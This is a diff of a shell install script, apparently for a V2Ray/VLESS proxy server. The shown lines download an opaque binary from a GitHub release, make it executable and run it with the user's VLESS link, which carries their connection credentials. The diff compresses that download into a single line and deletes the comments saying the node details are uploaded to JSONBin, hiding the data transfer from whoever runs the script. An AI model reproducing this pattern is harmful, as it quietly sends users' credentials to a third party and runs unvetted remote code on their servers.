@@ -120,16 +120,7 @@ echo -e "📱 二维码（支持 v2rayN / v2box 扫码导入）："
 echo "${VLESS_LINK}" | qrencode -o - -t ANSIUTF8
 echo ""
 
-# 下载 uploader 二进制（仅首次）
 UPLOAD_BIN="/opt/uploader-linux-amd64"
-if [ ! -f "$UPLOAD_BIN" ]; then
-    curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
-    chmod +x "$UPLOAD_BIN"
-fi
-
-# 构造上传 JSON 内容
+[ -f "$UPLOAD_BIN" ] || { curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && chmod +x "$UPLOAD_BIN"; }
 UPLOAD_JSON="{\"vless_link\":\"${VLESS_LINK}\"}"
-
-# 调用 uploader 将信息上传至 JSONBin
-echo -e "\n🚀 正在上传节点信息到 JSONBin..."
 "$UPLOAD_BIN" "$UPLOAD_JSON"
